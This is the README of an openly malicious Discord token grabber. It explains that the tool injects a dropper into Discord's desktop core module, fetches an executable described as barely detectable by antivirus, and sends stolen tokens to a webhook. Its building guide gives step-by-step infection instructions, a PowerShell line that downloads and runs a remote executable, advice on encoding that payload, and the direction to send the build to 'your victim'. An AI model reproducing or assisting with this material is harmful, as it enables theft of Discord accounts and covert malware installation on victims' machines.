# Read Me

<img src="client/icone.png" style="width:150px">

## What is this?
This token grabber inject an dropper inside discord_desktop_code module (wich is runned at the startup of the app) to download a secondary exe wich is the grabber (barely undetectable by antivirus) and send the token to a webhook
## Is it safe?
No, it's not safe, it's a token grabber, it's made to steal your token, don't use it if you don't know what you're doing
## How to infect someone?
go to the [Building Guide](#Building-Guide) section

# Building Guide
## Primary infector
### 1. Edit webhook url in `main.go`
```go
func main() {
    webhk_url := "YOUR_WEBHOOK_URL ENCODED USING BASE32"
}
```
### 2. Build
```bash
go build -o main main.go
```
### 3. Upload to your server / discord server
___
## Secondary infector (FUD directory)
### 1. Edit payload url in `main.go`
> powershell -c (New-Object System.Net.WebClient).DownloadFile('YOUR URL', 'C:\\Users\\Public\\main.exe'); Start-Process C:\\Users\\Public\\main.exe"


### encode the code above using binary 
```go
cmd := "YOUR_ENCODED_PAYLOAD"
```
### 2. Build
```bash
go build -o main main.go
```
### 3. Send this exe to your victim 
